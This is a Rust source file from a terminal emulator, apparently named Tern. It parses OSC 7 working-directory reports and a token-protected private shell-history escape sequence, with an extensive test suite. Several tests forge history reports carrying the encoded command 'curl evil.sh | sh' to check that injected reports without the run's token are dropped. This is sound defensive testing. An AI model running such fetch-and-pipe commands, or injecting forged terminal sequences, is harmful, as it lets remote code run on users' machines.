//! What a pane's shell reports about itself: the working directory with
//! OSC 7 (spec 0002, cwd; TM-escape-09), and the commands it ran with
//! Tern's private history report (spec 0021; TM-escape-14). vte parses
//! neither, so [`MarksPty`] wraps a PTY and scans the bytes it reads,
//! passing them on untouched. Only the reports are kept, never the output
//! around them.

use crate::history::{Entry, ShellKind};
use alacritty_terminal::event::{OnResize, WindowSize};
use alacritty_terminal::tty::{ChildEvent, EventedPty, EventedReadWrite};
use polling::{Event, PollMode, Poller};
use std::hash::{BuildHasher, RandomState};
use std::io::{self, Read};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};

/// Reports longer than this are ignored (TM-escape-10, -19).
const MAX_REPORT: usize = 4096;

/// The OSC number of Tern's history reports, which the snippets in
/// `shell-integration/` send: `command;<token>;<shell>;<history
/// number>;<percent-encoded command>` for a command the shell ran, and
/// `prompt;<token>;<shell>` as each prompt begins.
const HISTORY_OSC: &[u8] = b"6973";

/// Commands a pane holds until the app records them; more are dropped.
const MAX_QUEUED: usize = 32;

/// The environment variable that hands local shells [`history_token`].
pub const TOKEN_VAR: &str = "TERN_HISTORY_TOKEN";

/// This run's history token, which a report must carry to count
/// (TM-escape-14). It comes from std's hasher keys, which std seeds from
/// the OS once per process, so making it costs boot no syscall or IO
/// (spec 0021, Startup impact).
pub fn history_token() -> &'static str {
    static TOKEN: OnceLock<String> = OnceLock::new();
    TOKEN.get_or_init(|| {
        // Each RandomState has its own keys, so two give 128 bits.
        let half = || RandomState::new().hash_one(0u8);
        format!("{:016x}{:016x}", half(), half())
    })
}

/// The last cwd a pane's program reported, shared between the PTY's reader
/// thread and the pane.
pub struct Reported {
    /// An SSH pane's reports name a folder on the remote host.
    remote: bool,
    /// A local pane's checked local directory, or an SSH pane's remote path.
    path: Mutex<Option<String>>,
    /// A local pane's cwd changed since the pane last looked.
    changed: AtomicBool,
    /// Commands the shell reported that the app hasn't recorded yet.
    commands: Mutex<Vec<Entry>>,
    /// The history number of the last command report, so a prompt after
    /// a plain Enter isn't recorded again.
    last_number: Mutex<Option<String>>,
    /// The shell began a prompt the pane hasn't looked at yet.
    prompt: Mutex<Option<ShellKind>>,
}

impl Reported {
    pub fn new(remote: bool) -> Arc<Self> {
        Arc::new(Self {
            remote,
            path: Mutex::new(None),
            changed: AtomicBool::new(false),
            commands: Mutex::new(Vec::new()),
            last_number: Mutex::new(None),
            prompt: Mutex::new(None),
        })
    }

    /// The local directory a local pane's shell last reported.
    pub fn local(&self) -> Option<PathBuf> {
        if self.remote {
            return None;
        }
        self.path().map(PathBuf::from)
    }

    /// The remote folder an SSH pane's shell last reported. Untrusted: only
    /// ever a folder to list on that pane's own host (spec 0008).
    pub fn remote(&self) -> Option<String> {
        if !self.remote {
            return None;
        }
        self.path()
    }

    /// Whether a local pane's cwd changed since the last call.
    pub fn take_changed(&self) -> bool {
        self.changed.swap(false, Ordering::Relaxed)
    }

    /// Whether this is an SSH pane, whose reports name the remote host.
    pub fn is_remote(&self) -> bool {
        self.remote
    }

    /// The commands reported since the last call, oldest first.
    pub fn take_commands(&self) -> Vec<Entry> {
        self.commands
            .lock()
            .map(|mut commands| std::mem::take(&mut *commands))
            .unwrap_or_default()
    }

    /// The shell that began a prompt since the last call, if one did.
    pub fn take_prompt(&self) -> Option<ShellKind> {
        self.prompt.lock().ok()?.take()
    }

    fn path(&self) -> Option<String> {
        self.path.lock().ok()?.clone()
    }

    /// Takes the payload of one OSC 7: a local pane keeps it only if it
    /// names an existing directory on this machine.
    fn report(&self, kind: Kind, payload: &[u8]) {
        match kind {
            Kind::Cwd => self.report_cwd(payload),
            Kind::History => self.report_history(payload),
        }
    }

    /// Takes one history report. It counts only in a local pane and with
    /// this run's token [load-bearing] (TM-escape-14); what the history
    /// stores is decided when the app records it.
    fn report_history(&self, payload: &[u8]) {
        if self.remote {
            return;
        }
        let (number, entry) = match parse_history(payload, history_token()) {
            Some(Report::Command(number, entry)) => (number, entry),
            Some(Report::Prompt(shell)) => {
                if let Ok(mut prompt) = self.prompt.lock() {
                    *prompt = Some(shell);
                }
                return;
            }
            None => return,
        };
        let Ok(mut last) = self.last_number.lock() else {
            return;
        };
        if last.as_deref() == Some(number.as_str()) {
            return;
        }
        *last = Some(number);
        if let Ok(mut commands) = self.commands.lock()
            && commands.len() < MAX_QUEUED
        {
            commands.push(entry);
        }
    }

    fn report_cwd(&self, payload: &[u8]) {
        let Some((host, path)) = parse(payload) else {
            return;
        };
        let path = if self.remote {
            path
        } else {
            match local_dir(&host, &path, this_host()) {
                Some(dir) => dir,
                None => return,
            }
        };
        if let Ok(mut last) = self.path.lock()
            && last.as_deref() != Some(path.as_str())
        {
            *last = Some(path);
            if !self.remote {
                self.changed.store(true, Ordering::Relaxed);
            }
        }
    }
}

/// Which report an OSC is.
#[derive(Clone, Copy, Debug, PartialEq)]
enum Kind {
    /// OSC 7, the working directory.
    Cwd,
    /// [`HISTORY_OSC`], a command the shell ran.
    History,
}

impl Kind {
    /// The report an OSC number names, if Tern reads it.
    fn of(number: &[u8]) -> Option<Self> {
        match number {
            b"7" => Some(Self::Cwd),
            HISTORY_OSC => Some(Self::History),
            _ => None,
        }
    }
}

/// Where the scanner is in the byte stream. Reads split sequences
/// anywhere, so the state carries over between them.
#[derive(Debug, PartialEq)]
enum State {
    Ground,
    Escape,
    /// After `ESC ]`, collecting the OSC number.
    Introducer,
    /// Collecting the payload, up to [`MAX_REPORT`] bytes.
    Payload(Kind),
    /// An `ESC` inside the payload: `\` ends it (ST).
    PayloadEscape(Kind),
}

/// Finds `ESC ] <number> ; <payload> (BEL | ESC \)` in a byte stream,
/// for the numbers [`Kind`] knows.
struct Scanner {
    state: State,
    number: Vec<u8>,
    payload: Vec<u8>,
    too_long: bool,
}

impl Scanner {
    fn new() -> Self {
        Self {
            state: State::Ground,
            number: Vec::new(),
            payload: Vec::new(),
            too_long: false,
        }
    }

    /// Feeds `bytes`, calling `found` with each complete report.
    fn feed(&mut self, bytes: &[u8], found: &mut impl FnMut(Kind, &[u8])) {
        for &byte in bytes {
            self.step(byte, found);
        }
    }

    fn step(&mut self, byte: u8, found: &mut impl FnMut(Kind, &[u8])) {
        const ESC: u8 = 0x1b;
        const BEL: u8 = 0x07;
        // CAN and SUB cancel any sequence, as in vte.
        if matches!(byte, 0x18 | 0x1a) {
            self.state = State::Ground;
            return;
        }
        self.state = match (&self.state, byte) {
            (State::Ground, ESC) => State::Escape,
            (State::Ground, _) => State::Ground,
            (State::Escape, b']') => {
                self.number.clear();
                State::Introducer
            }
            (State::Escape, ESC) => State::Escape,
            (State::Escape, _) => State::Ground,
            (State::Introducer, b';') => match Kind::of(&self.number) {
                Some(kind) => {
                    self.payload.clear();
                    self.too_long = false;
                    State::Payload(kind)
                }
                None => State::Ground,
            },
            (State::Introducer, b'0'..=b'9') if self.number.len() < HISTORY_OSC.len() => {
                self.number.push(byte);
                State::Introducer
            }
            (State::Introducer, ESC) => State::Escape,
            (State::Introducer, _) => State::Ground,
            (&State::Payload(kind), BEL) => {
                self.finish(kind, found);
                State::Ground
            }
            (&State::Payload(kind), ESC) => State::PayloadEscape(kind),
            (&State::Payload(kind), _) => {
                if self.payload.len() < MAX_REPORT {
                    self.payload.push(byte);
                } else {
                    self.too_long = true;
                }
                State::Payload(kind)
            }
            (&State::PayloadEscape(kind), b'\\') => {
                self.finish(kind, found);
                State::Ground
            }
            // Any other escape cancels the report and starts a sequence.
            (State::PayloadEscape(_), _) => {
                self.state = State::Escape;
                return self.step(byte, found);
            }
        };
    }

    fn finish(&mut self, kind: Kind, found: &mut impl FnMut(Kind, &[u8])) {
        if !self.too_long {
            found(kind, &self.payload);
        }
        self.payload.clear();
    }
}

/// The host and the percent-decoded path of a `file://host/path` URL.
/// `None` for anything else, or a path that isn't UTF-8 (OQ-028).
fn parse(payload: &[u8]) -> Option<(String, String)> {
    let rest = payload.strip_prefix(b"file://")?;
    let slash = rest.iter().position(|&byte| byte == b'/')?;
    let host = String::from_utf8(decode(&rest[..slash])?).ok()?;
    let path = String::from_utf8(decode(&rest[slash..])?).ok()?;
    Some((host, path))
}

/// What a history report says.
enum Report {
    /// A command the shell ran, with its history number.
    Command(String, Entry),
    /// The shell begins a prompt.
    Prompt(ShellKind),
}

/// What a history report carrying `token` says. `None` for another token,
/// an unknown report or shell, or a command that isn't UTF-8.
fn parse_history(payload: &[u8], token: &str) -> Option<Report> {
    let mut fields = payload.splitn(5, |&byte| byte == b';');
    let report = fields.next()?;
    if fields.next()? != token.as_bytes() {
        return None;
    }
    let shell = ShellKind::parse(std::str::from_utf8(fields.next()?).ok()?)?;
    match report {
        b"command" => {
            let number = String::from_utf8(fields.next()?.to_vec()).ok()?;
            let command = String::from_utf8(decode(fields.next()?)?).ok()?;
            Some(Report::Command(number, Entry { shell, command }))
        }
        b"prompt" => Some(Report::Prompt(shell)),
        _ => None,
    }
}

/// Percent-decodes `bytes`; `None` for a malformed escape or a NUL.
fn decode(bytes: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(bytes.len());
    let mut iter = bytes.iter();
    while let Some(&byte) = iter.next() {
        let byte = if byte == b'%' {
            let hex = [*iter.next()?, *iter.next()?];
            u8::from_str_radix(std::str::from_utf8(&hex).ok()?, 16).ok()?
        } else {
            byte
        };
        if byte == 0 {
            return None;
        }
        out.push(byte);
    }
    Some(out)
}

/// The local directory a report names, if it counts (TM-escape-09
/// [load-bearing]): its host is empty, `localhost` or `this_host`, and its
/// path is an existing absolute directory. On Windows only a drive path
/// counts (`/C:/…`): a UNC path would reach the network to check.
fn local_dir(host: &str, path: &str, this_host: Option<&str>) -> Option<String> {
    let local = host.is_empty()
        || host.eq_ignore_ascii_case("localhost")
        || this_host.is_some_and(|name| host.eq_ignore_ascii_case(name));
    if !local {
        return None;
    }
    let path = if cfg!(windows) {
        let drive = path.strip_prefix('/')?;
        let bytes = drive.as_bytes();
        let is_drive = bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':';
        if !is_drive || bytes.get(2).is_some_and(|&byte| byte != b'/') {
            return None;
        }
        // `C:` alone is the drive's current folder, not its root.
        if bytes.len() == 2 {
            format!("{drive}/")
        } else {
            drive.to_owned()
        }
    } else {
        path.to_owned()
    };
    let dir = Path::new(&path);
    (dir.is_absolute() && dir.is_dir()).then_some(path)
}

/// This machine's name, as shells put it in their reports: the kernel's
/// hostname on Linux, `COMPUTERNAME` on Windows. Read once, on the first
/// report.
fn this_host() -> Option<&'static str> {
    static NAME: OnceLock<Option<String>> = OnceLock::new();
    NAME.get_or_init(|| {
        let name = if cfg!(target_os = "linux") {
            std::fs::read_to_string("/proc/sys/kernel/hostname").ok()
        } else if cfg!(windows) {
            std::env::var("COMPUTERNAME").ok()
        } else {
            None
        };
        name.map(|name| name.trim().to_owned())
            .filter(|name| !name.is_empty())
    })
    .as_deref()
}

/// A PTY whose output is scanned for the shell's reports on its way to
/// the parser. The event loop reads through it as through the PTY itself;
/// everything else is the PTY's.
pub struct MarksPty<P> {
    pty: P,
    scanner: Scanner,
    reported: Arc<Reported>,
}

impl<P> MarksPty<P> {
    pub fn new(pty: P, reported: Arc<Reported>) -> Self {
        Self {
            pty,
            scanner: Scanner::new(),
            reported,
        }
    }
}

impl<P: EventedReadWrite> Read for MarksPty<P> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let read = self.pty.reader().read(buf)?;
        let reported = &self.reported;
        self.scanner.feed(&buf[..read], &mut |kind, payload| {
            reported.report(kind, payload)
        });
        Ok(read)
    }
}

impl<P: EventedReadWrite> EventedReadWrite for MarksPty<P> {
    type Reader = Self;
    type Writer = P::Writer;

    unsafe fn register(
        &mut self,
        poll: &Arc<Poller>,
        event: Event,
        mode: PollMode,
    ) -> io::Result<()> {
        // SAFETY: the PTY's sources live as long as this wrapper, which the
        // event loop deregisters before dropping, as it would the PTY.
        unsafe { self.pty.register(poll, event, mode) }
    }

    fn reregister(&mut self, poll: &Arc<Poller>, event: Event, mode: PollMode) -> io::Result<()> {
        self.pty.reregister(poll, event, mode)
    }

    fn deregister(&mut self, poll: &Arc<Poller>) -> io::Result<()> {
        self.pty.deregister(poll)
    }

    fn reader(&mut self) -> &mut Self {
        self
    }

    fn writer(&mut self) -> &mut P::Writer {
        self.pty.writer()
    }
}

impl<P: EventedPty> EventedPty for MarksPty<P> {
    fn next_child_event(&mut self) -> Option<ChildEvent> {
        self.pty.next_child_event()
    }
}

impl<P: OnResize> OnResize for MarksPty<P> {
    fn on_resize(&mut self, size: WindowSize) {
        self.pty.on_resize(size);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(chunks: &[&[u8]]) -> Vec<String> {
        let mut scanner = Scanner::new();
        let mut found = Vec::new();
        for chunk in chunks {
            scanner.feed(chunk, &mut |_, payload| {
                found.push(String::from_utf8_lossy(payload).into_owned());
            });
        }
        found
    }

    #[test]
    fn finds_reports_ended_by_bel_or_st_between_other_output() {
        let found =
            scan(&[b"ls\r\n\x1b]0;title\x07\x1b]7;file://h/a\x07$ \x1b]7;file://h/b\x1b\\x"]);
        assert_eq!(found, ["file://h/a", "file://h/b"]);
    }

    #[test]
    fn finds_a_report_split_across_reads_at_every_byte() {
        let stream = b"out\x1b]7;file:///tmp/x\x1b\\more";
        for at in 0..stream.len() {
            let (first, second) = stream.split_at(at);
            assert_eq!(scan(&[first, second]), ["file:///tmp/x"], "split at {at}");
        }
    }

    #[test]
    fn ignores_reports_over_4_kib_and_cancelled_ones() {
        let mut long = b"\x1b]7;file:///".to_vec();
        long.extend(std::iter::repeat_n(b'a', MAX_REPORT));
        long.extend(b"\x07\x1b]7;file:///ok\x07");
        assert_eq!(scan(&[&long]), ["file:///ok"]);
        assert!(scan(&[b"\x1b]7;file:///a\x18\x07"]).is_empty(), "CAN");
        assert_eq!(
            scan(&[b"\x1b]7;file:///a\x1b]7;file:///b\x07"]),
            ["file:///b"],
            "a new sequence cancels the open one"
        );
    }

    #[test]
    fn other_oscs_are_no_reports() {
        assert!(scan(&[b"\x1b]77;file:///a\x07\x1b]8;;file:///b\x07"]).is_empty());
    }

    #[test]
    fn parse_splits_host_and_decodes_the_path() {
        assert_eq!(
            parse(b"file://box/home/me/my%20dir"),
            Some(("box".into(), "/home/me/my dir".into()))
        );
        assert_eq!(parse(b"file:///tmp"), Some((String::new(), "/tmp".into())));
        assert_eq!(parse(b"http://box/tmp"), None);
        assert_eq!(parse(b"file://box"), None, "no path");
        assert_eq!(parse(b"file:///a%2"), None, "cut escape");
        assert_eq!(parse(b"file:///a%00b"), None, "NUL");
        assert_eq!(parse(b"file:///a%FF"), None, "not UTF-8");
    }

    #[cfg(unix)]
    #[test]
    fn a_local_report_counts_only_for_this_machine_and_an_existing_directory() {
        let dir = std::env::temp_dir();
        let dir = dir.to_str().expect("temp dir is UTF-8");
        for host in ["", "localhost", "LOCALHOST", "box"] {
            assert_eq!(
                local_dir(host, dir, Some("box")).as_deref(),
                Some(dir),
                "{host:?}"
            );
        }
        assert_eq!(local_dir("elsewhere", dir, Some("box")), None);
        assert_eq!(local_dir("", "/no/such/dir", Some("box")), None);
        assert_eq!(local_dir("", "relative", Some("box")), None);
    }

    #[cfg(windows)]
    #[test]
    fn a_local_report_on_windows_counts_only_as_a_drive_path() {
        let dir = std::env::temp_dir();
        let dir = dir.to_str().expect("temp dir is UTF-8").replace('\\', "/");
        let reported = format!("/{dir}");
        for host in ["", "localhost", "box", "BOX"] {
            assert_eq!(
                local_dir(host, &reported, Some("box")),
                Some(dir.clone()),
                "{host:?}"
            );
        }
        assert_eq!(local_dir("elsewhere", &reported, Some("box")), None);
        assert_eq!(local_dir("", "//server/share", Some("box")), None, "UNC");
        assert_eq!(local_dir("", "/C:", None).as_deref(), Some("C:/"));
        assert_eq!(local_dir("", "/C:x", None), None);
    }

    #[test]
    fn a_remote_report_keeps_any_path_and_sets_no_local_cwd() {
        let remote = Reported::new(true);
        remote.report_cwd(b"file://prod/srv/app");
        assert_eq!(remote.remote().as_deref(), Some("/srv/app"));
        assert_eq!(remote.local(), None);
        assert!(!remote.take_changed(), "a remote cwd is never saved");
    }

    #[test]
    fn a_local_report_changes_the_cwd_once_per_new_directory() {
        let local = Reported::new(false);
        let dir = std::env::temp_dir();
        let url = if cfg!(windows) {
            format!("file:///{}", dir.display()).replace('\\', "/")
        } else {
            format!("file://{}", dir.display())
        };
        local.report_cwd(url.as_bytes());
        assert!(local.local().is_some_and(|path| path.is_dir()));
        assert_eq!(local.remote(), None);
        assert!(local.take_changed());
        local.report_cwd(url.as_bytes());
        assert!(!local.take_changed(), "the same directory again");
        local.report_cwd(b"file://elsewhere.example/tmp");
        assert!(!local.take_changed(), "another machine's report is ignored");
    }

    /// Feeds `chunks` to a scanner that hands its reports to `reported`,
    /// as [`MarksPty`] does with what it reads.
    fn feed(reported: &Reported, chunks: &[&[u8]]) {
        let mut scanner = Scanner::new();
        for chunk in chunks {
            scanner.feed(chunk, &mut |kind, payload| reported.report(kind, payload));
        }
    }

    /// A history report of `command` (already percent-encoded) with
    /// `token`, ended by BEL.
    fn history_report(token: &str, shell: &str, number: u32, command: &str) -> Vec<u8> {
        format!("\x1b]6973;command;{token};{shell};{number};{command}\x07").into_bytes()
    }

    fn entry(shell: ShellKind, command: &str) -> Entry {
        Entry {
            shell,
            command: command.into(),
        }
    }

    #[test]
    fn the_history_token_is_128_random_bits_fixed_for_the_run() {
        let token = history_token();
        assert_eq!(token.len(), 32, "{token}");
        assert!(token.bytes().all(|b| b.is_ascii_hexdigit()), "{token}");
        assert_eq!(history_token(), token);
    }

    /// Spec 0021, flow 1: a report with this run's token is queued with
    /// its shell kind and the decoded command, and taking drains it.
    #[test]
    fn a_history_report_with_the_token_is_queued() {
        let local = Reported::new(false);
        let report = history_report(history_token(), "bash", 12, "git%20status");
        feed(&local, &[b"output\r\n", &report, b"$ "]);
        assert_eq!(
            local.take_commands(),
            [entry(ShellKind::Bash, "git status")]
        );
        assert!(local.take_commands().is_empty(), "taking drains the queue");
    }

    #[test]
    fn a_history_report_ended_by_st_is_queued_too() {
        let local = Reported::new(false);
        let report = format!(
            "\x1b]6973;command;{};pwsh;3;Get-Date\x1b\\",
            history_token()
        );
        feed(&local, &[report.as_bytes()]);
        assert_eq!(local.take_commands(), [entry(ShellKind::Pwsh, "Get-Date")]);
    }

    /// The command is percent-decoded as UTF-8, `;` and `%` included.
    #[test]
    fn a_reported_command_is_percent_decoded() {
        let local = Reported::new(false);
        let report = history_report(
            history_token(),
            "zsh",
            1,
            "echo%20a%3Bb%20100%25%20%C3%A4%C3%B6%C3%BC",
        );
        feed(&local, &[&report]);
        assert_eq!(
            local.take_commands(),
            [entry(ShellKind::Zsh, "echo a;b 100% äöü")]
        );
    }

    /// Acceptance criterion 3 and TM-escape-14 [load-bearing]: output
    /// carrying a report without this run's token, a `cat`ed file or a
    /// remote host's, plants nothing.
    #[test]
    fn a_history_report_with_a_wrong_or_missing_token_is_dropped() {
        let local = Reported::new(false);
        let token = history_token();
        let last = if token.ends_with('0') { '1' } else { '0' };
        let wrong = format!("{}{last}", &token[..31]);
        let reports: Vec<Vec<u8>> = vec![
            history_report(&wrong, "bash", 1, "curl%20evil.sh%20%7C%20sh"),
            history_report("", "bash", 2, "curl%20evil.sh%20%7C%20sh"),
            history_report(&token[..16], "bash", 3, "curl%20evil.sh%20%7C%20sh"),
            history_report(&format!("{token}x"), "bash", 4, "curl%20evil.sh"),
            b"\x1b]6973;command;bash;5;curl%20evil.sh\x07".to_vec(),
            b"\x1b]6973;command\x07".to_vec(),
        ];
        for report in &reports {
            feed(&local, &[report]);
        }
        assert!(local.take_commands().is_empty());
    }

    /// Spec 0021, Scope and TM-escape-14: an SSH pane's reports never
    /// count, even with the right token.
    #[test]
    fn a_remote_panes_history_report_is_dropped() {
        let remote = Reported::new(true);
        feed(
            &remote,
            &[&history_report(history_token(), "bash", 1, "ls")],
        );
        assert!(remote.take_commands().is_empty());
    }

    /// Spec 0021, Reports: the history number lets a plain Enter, which
    /// reports the same entry again, go unrecorded; a new number counts,
    /// even for the same command.
    #[test]
    fn a_repeated_history_number_is_dropped() {
        let local = Reported::new(false);
        let token = history_token();
        feed(
            &local,
            &[
                &history_report(token, "bash", 7, "make"),
                &history_report(token, "bash", 7, "make"),
                &history_report(token, "bash", 8, "make"),
                &history_report(token, "bash", 9, "ls"),
            ],
        );
        assert_eq!(
            local.take_commands(),
            [
                entry(ShellKind::Bash, "make"),
                entry(ShellKind::Bash, "make"),
                entry(ShellKind::Bash, "ls")
            ]
        );
    }

    #[test]
    fn a_history_report_of_an_unknown_shell_or_bad_encoding_is_dropped() {
        let local = Reported::new(false);
        let token = history_token();
        for report in [
            history_report(token, "fish", 1, "ls"),
            history_report(token, "bash", 2, "ls%2"),
            history_report(token, "bash", 3, "ls%00"),
            history_report(token, "bash", 4, "ls%FF"),
        ] {
            feed(&local, &[&report]);
        }
        assert!(local.take_commands().is_empty());
    }

    /// TM-escape-19: a report over 4 KiB is ignored.
    #[test]
    fn a_history_report_over_4_kib_is_dropped() {
        let local = Reported::new(false);
        let long = "x".repeat(MAX_REPORT);
        feed(
            &local,
            &[&history_report(history_token(), "bash", 1, &long)],
        );
        assert!(local.take_commands().is_empty());
    }

    #[test]
    fn a_history_report_split_across_reads_at_every_byte_is_queued() {
        let mut stream = b"out".to_vec();
        stream.extend(history_report(history_token(), "bash", 4, "git%20log"));
        stream.extend(b"more");
        for at in 0..stream.len() {
            let local = Reported::new(false);
            let (first, second) = stream.split_at(at);
            feed(&local, &[first, second]);
            assert_eq!(
                local.take_commands(),
                [entry(ShellKind::Bash, "git log")],
                "split at {at}"
            );
        }
    }

    /// Spec 0002 still holds: OSC 7 between history reports sets the cwd,
    /// and neither report disturbs the other.
    #[test]
    fn osc7_and_history_reports_in_one_stream_are_both_taken() {
        let local = Reported::new(false);
        let dir = std::env::temp_dir();
        let url = if cfg!(windows) {
            format!("file:///{}", dir.display()).replace('\\', "/")
        } else {
            format!("file://{}", dir.display())
        };
        let cwd = format!("\x1b]7;{url}\x1b\\");
        let token = history_token();
        feed(
            &local,
            &[
                &history_report(token, "bash", 1, "cd%20%2Ftmp"),
                cwd.as_bytes(),
                &history_report(token, "bash", 2, "ls"),
            ],
        );
        assert!(local.local().is_some_and(|path| path.is_dir()));
        assert!(local.take_changed());
        assert_eq!(
            local.take_commands(),
            [
                entry(ShellKind::Bash, "cd /tmp"),
                entry(ShellKind::Bash, "ls")
            ]
        );
    }

    /// A prompt report of `shell` with `token`, ended by BEL.
    fn prompt_report(token: &str, shell: &str) -> Vec<u8> {
        format!("\x1b]6973;prompt;{token};{shell}\x07").into_bytes()
    }

    /// Spec 0021, Reports: a prompt report with this run's token says a
    /// prompt began and carries the shell kind; the pane takes it once.
    #[test]
    fn a_prompt_report_with_the_token_is_taken_once_with_its_shell_kind() {
        for (name, shell) in [
            ("bash", ShellKind::Bash),
            ("zsh", ShellKind::Zsh),
            ("pwsh", ShellKind::Pwsh),
        ] {
            let local = Reported::new(false);
            assert_eq!(local.take_prompt(), None, "before any report");
            feed(
                &local,
                &[b"output\r\n", &prompt_report(history_token(), name), b"$ "],
            );
            assert_eq!(local.take_prompt(), Some(shell));
            assert_eq!(local.take_prompt(), None, "{name}: taking drains it");
        }
    }

    #[test]
    fn a_prompt_report_ended_by_st_is_taken_too() {
        let local = Reported::new(false);
        let report = format!("\x1b]6973;prompt;{};zsh\x1b\\", history_token());
        feed(&local, &[report.as_bytes()]);
        assert_eq!(local.take_prompt(), Some(ShellKind::Zsh));
    }

    /// Acceptance criterion 3 and TM-escape-18: "Prompt reports need the
    /// token too". A forged one in output, with a wrong, cut, longer or
    /// missing token, begins no prompt.
    #[test]
    fn a_prompt_report_with_a_wrong_or_missing_token_is_dropped() {
        let local = Reported::new(false);
        let token = history_token();
        let last = if token.ends_with('0') { '1' } else { '0' };
        let wrong = format!("{}{last}", &token[..31]);
        let reports: Vec<Vec<u8>> = vec![
            prompt_report(&wrong, "bash"),
            prompt_report("", "bash"),
            prompt_report(&token[..16], "bash"),
            prompt_report(&format!("{token}x"), "bash"),
            b"\x1b]6973;prompt;bash\x07".to_vec(),
            b"\x1b]6973;prompt\x07".to_vec(),
            b"\x1b]6973;\x07".to_vec(),
        ];
        for report in &reports {
            feed(&local, &[report]);
            assert_eq!(
                local.take_prompt(),
                None,
                "{:?}",
                String::from_utf8_lossy(report)
            );
        }
    }

    /// TM-escape-18: a garbled report with the right token begins no
    /// prompt either: an unknown shell, an unknown kind of report, or
    /// the shell missing.
    #[test]
    fn a_garbled_prompt_report_is_dropped() {
        let local = Reported::new(false);
        let token = history_token();
        let reports = [
            prompt_report(token, "fish"),
            prompt_report(token, "Bash"),
            prompt_report(token, ""),
            format!("\x1b]6973;prompt;{token}\x07").into_bytes(),
            format!("\x1b]6973;prompts;{token};bash\x07").into_bytes(),
            format!("\x1b]6973;PROMPT;{token};bash\x07").into_bytes(),
            format!("\x1b]6974;prompt;{token};bash\x07").into_bytes(),
        ];
        for report in &reports {
            feed(&local, &[report]);
            // Never the token itself in a failure message.
            let shown = String::from_utf8_lossy(report).replace(token, "<token>");
            assert_eq!(local.take_prompt(), None, "{shown:?}");
        }
    }

    /// Spec 0021, Scope and acceptance criterion 10: an SSH pane's prompt
    /// report never counts, even with the right token, so no suggestion
    /// shows there.
    #[test]
    fn a_remote_panes_prompt_report_is_dropped() {
        let remote = Reported::new(true);
        feed(&remote, &[&prompt_report(history_token(), "bash")]);
        assert_eq!(remote.take_prompt(), None);
    }

    /// Spec 0021, flow 3 ("the pane's last-reported shell kind"): of two
    /// prompts the pane hasn't looked at, the newer one counts, as when
    /// zsh starts inside bash.
    #[test]
    fn the_newest_prompt_report_wins() {
        let local = Reported::new(false);
        let token = history_token();
        feed(
            &local,
            &[&prompt_report(token, "bash"), &prompt_report(token, "zsh")],
        );
        assert_eq!(local.take_prompt(), Some(ShellKind::Zsh));
        assert_eq!(local.take_prompt(), None);
    }

    /// Spec 0021, Reports: the two reports don't disturb each other. A
    /// prompt report queues no command and doesn't reset the history
    /// number a plain Enter repeats; a command report begins no prompt.
    #[test]
    fn prompt_and_command_reports_are_kept_apart() {
        let local = Reported::new(false);
        let token = history_token();
        feed(&local, &[&history_report(token, "bash", 7, "make")]);
        assert_eq!(local.take_prompt(), None, "a command is no prompt");
        feed(
            &local,
            &[
                &prompt_report(token, "bash"),
                // A plain Enter: the same entry again, then the next prompt.
                &history_report(token, "bash", 7, "make"),
                &prompt_report(token, "bash"),
            ],
        );
        assert_eq!(local.take_commands(), [entry(ShellKind::Bash, "make")]);
        assert_eq!(local.take_prompt(), Some(ShellKind::Bash));
    }

    #[test]
    fn a_prompt_report_split_across_reads_at_every_byte_is_taken() {
        let mut stream = b"out".to_vec();
        stream.extend(prompt_report(history_token(), "pwsh"));
        stream.extend(b"PS> ");
        for at in 0..stream.len() {
            let local = Reported::new(false);
            let (first, second) = stream.split_at(at);
            feed(&local, &[first, second]);
            assert_eq!(local.take_prompt(), Some(ShellKind::Pwsh), "split at {at}");
        }
    }
}
